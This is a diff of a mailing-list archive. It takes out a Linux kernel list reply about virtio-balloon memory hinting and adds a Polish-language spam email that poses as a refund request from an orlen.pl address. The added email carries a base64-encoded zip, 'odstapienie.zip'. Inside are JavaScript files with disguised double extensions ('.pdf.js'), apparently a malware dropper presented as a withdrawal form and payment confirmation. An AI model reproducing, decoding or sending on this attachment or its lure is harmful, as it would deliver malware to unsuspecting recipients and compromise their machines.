@@ -2,110 +2,108 @@ Return-Path: <linux-kernel-owner@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by mail.lfdr.de (Postfix) with ESMTP id 22E266D5FE
-	for <lists+linux-kernel@lfdr.de>; Thu, 18 Jul 2019 22:49:17 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id B6D676D626
+	for <lists+linux-kernel@lfdr.de>; Thu, 18 Jul 2019 22:59:05 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1728101AbfGRUtN (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
-        Thu, 18 Jul 2019 16:49:13 -0400
-Received: from mx1.redhat.com ([209.132.183.28]:51386 "EHLO mx1.redhat.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1726040AbfGRUtN (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-        Thu, 18 Jul 2019 16:49:13 -0400
-Received: from smtp.corp.redhat.com (int-mx08.intmail.prod.int.phx2.redhat.com [10.5.11.23])
-        (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
-        (No client certificate requested)
-        by mx1.redhat.com (Postfix) with ESMTPS id 40A2230B8E03;
-        Thu, 18 Jul 2019 20:49:12 +0000 (UTC)
-Received: from redhat.com (ovpn-120-147.rdu2.redhat.com [10.10.120.147])
-        by smtp.corp.redhat.com (Postfix) with SMTP id D4D7F19D7A;
-        Thu, 18 Jul 2019 20:48:57 +0000 (UTC)
-Date:   Thu, 18 Jul 2019 16:48:56 -0400
-From:   "Michael S. Tsirkin" <mst@redhat.com>
-To:     Alexander Duyck <alexander.duyck@gmail.com>
-Cc:     Nitesh Narayan Lal <nitesh@redhat.com>,
-        kvm list <kvm@vger.kernel.org>,
-        David Hildenbrand <david@redhat.com>,
-        Dave Hansen <dave.hansen@intel.com>,
-        LKML <linux-kernel@vger.kernel.org>,
-        linux-mm <linux-mm@kvack.org>,
-        Andrew Morton <akpm@linux-foundation.org>,
-        Yang Zhang <yang.zhang.wz@gmail.com>, pagupta@redhat.com,
-        Rik van Riel <riel@surriel.com>,
-        Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>,
-        lcapitulino@redhat.com, wei.w.wang@intel.com,
-        Andrea Arcangeli <aarcange@redhat.com>,
-        Paolo Bonzini <pbonzini@redhat.com>, dan.j.williams@intel.com,
-        Alexander Duyck <alexander.h.duyck@linux.intel.com>
-Subject: Re: [PATCH v1 6/6] virtio-balloon: Add support for aerating memory
- via hinting
-Message-ID: <20190718164656-mutt-send-email-mst@kernel.org>
-References: <20190716115535-mutt-send-email-mst@kernel.org>
- <CAKgT0Ud47-cWu9VnAAD_Q2Fjia5gaWCz_L9HUF6PBhbugv6tCQ@mail.gmail.com>
- <20190716125845-mutt-send-email-mst@kernel.org>
- <CAKgT0UfgPdU1H5ZZ7GL7E=_oZNTzTwZN60Q-+2keBxDgQYODfg@mail.gmail.com>
- <20190717055804-mutt-send-email-mst@kernel.org>
- <CAKgT0Uf4iJxEx+3q_Vo9L1QPuv9PhZUv1=M9UCsn6_qs7rG4aw@mail.gmail.com>
- <20190718003211-mutt-send-email-mst@kernel.org>
- <CAKgT0UfQ3dtfjjm8wnNxX1+Azav6ws9zemH6KYc7RuyvyFo3fQ@mail.gmail.com>
- <20190718162040-mutt-send-email-mst@kernel.org>
- <CAKgT0UcKTzSYZnYsMQoG6pXhpDS7uLbDd31dqfojCSXQWSsX_A@mail.gmail.com>
+        id S2391472AbfGRU7E (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
+        Thu, 18 Jul 2019 16:59:04 -0400
+Received: from [23.106.125.11] ([23.106.125.11]:49224 "EHLO WIN-M5327EF98B9"
+        rhost-flags-FAIL-FAIL-OK-FAIL) by vger.kernel.org with ESMTP
+        id S1727685AbfGRU7E (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+        Thu, 18 Jul 2019 16:59:04 -0400
+X-Greylist: delayed 1173 seconds by postgrey-1.27 at vger.kernel.org; Thu, 18 Jul 2019 16:58:41 EDT
+Received: from WIN-M5327EF98B9 ([23.106.125.11]) by WIN-M5327EF98B9 with Microsoft SMTPSVC(7.5.7601.17514);
+         Thu, 18 Jul 2019 13:32:39 -0700
+From:   "EWELINA KOZLOWSKA" <ewelina.kozlowska@orlen.pl>
+Subject: Rezygnacja z zamowienia
+To:     linux-kernel@vger.kernel.org
+Content-Type: multipart/mixed; boundary="FAcq160vTBnO=_MFIyeZAXsYz4r61syox10"
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <CAKgT0UcKTzSYZnYsMQoG6pXhpDS7uLbDd31dqfojCSXQWSsX_A@mail.gmail.com>
-X-Scanned-By: MIMEDefang 2.84 on 10.5.11.23
-X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.5.110.47]); Thu, 18 Jul 2019 20:49:12 +0000 (UTC)
+Reply-To: ewelina.kozlowska@orlen.pl
+Date:   Thu, 18 Jul 2019 13:32:39 -0700
+Message-ID: <WIN-M5327EF98B9KbK10002756b@WIN-M5327EF98B9>
+X-OriginalArrivalTime: 18 Jul 2019 20:32:39.0456 (UTC) FILETIME=[F14E2200:01D53DA7]
 Sender: linux-kernel-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Thu, Jul 18, 2019 at 01:34:03PM -0700, Alexander Duyck wrote:
-> On Thu, Jul 18, 2019 at 1:24 PM Michael S. Tsirkin <mst@redhat.com> wrote:
-> >
-> > On Thu, Jul 18, 2019 at 08:34:37AM -0700, Alexander Duyck wrote:
-> > > > > > For example we allocate pages until shrinker kicks in.
-> > > > > > Fair enough but in fact many it would be better to
-> > > > > > do the reverse: trigger shrinker and then send as many
-> > > > > > free pages as we can to host.
-> > > > >
-> > > > > I'm not sure I understand this last part.
-> > > >
-> > > > Oh basically what I am saying is this: one of the reasons to use page
-> > > > hinting is when host is short on memory.  In that case, why don't we use
-> > > > shrinker to ask kernel drivers to free up memory? Any memory freed could
-> > > > then be reported to host.
-> > >
-> > > Didn't the balloon driver already have a feature like that where it
-> > > could start shrinking memory if the host was under memory pressure? If
-> > > so how would adding another one add much value.
-> >
-> > Well fundamentally the basic balloon inflate kind of does this, yes :)
-> >
-> > The difference with what I am suggesting is that balloon inflate tries
-> > to aggressively achieve a specific goal of freed memory. We could have a
-> > weaker "free as much as you can" that is still stronger than free page
-> > hint which as you point out below does not try to free at all, just
-> > hints what is already free.
-> 
-> Yes, but why wait until the host is low on memory?
+This is a multi-part message in MIME format
 
-It can come about for a variety of reasons, such as
-other VMs being aggressive, or ours aggressively caching
-stuff in memory.
+--FAcq160vTBnO=_MFIyeZAXsYz4r61syox10
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
 
-> With my
-> implementation we can perform the hints in the background for a low
-> cost already. So why should we wait to free up memory when we could do
-> it immediately. Why let things get to the state where the host is
-> under memory pressure when the guests can be proactively freeing up
-> the pages and improving performance as a result be reducing swap
-> usage?
+Witam, zgodnie z rozmowa telefoniczna , wysylam formularz odstapienia =
+i potwierdzenie przelewu za zamowienie, poprosze o zwrot na ten sam nu=
+mer rachunki.
 
-You are talking about sending free memory to host.
-Fair enough but if you have drivers that aggressively
-allocate memory then there won't be that much free guest
-memory without invoking a shrinker.
+Pozdrawiam
 
--- 
-MST
+--FAcq160vTBnO=_MFIyeZAXsYz4r61syox10
+Content-Type: application/octet-stream;
+        name="odstapienie.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+        filename="odstapienie.zip"
+
+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
+AgACAPYAAAB6CwAAAAA=
+
+--FAcq160vTBnO=_MFIyeZAXsYz4r61syox10--
+
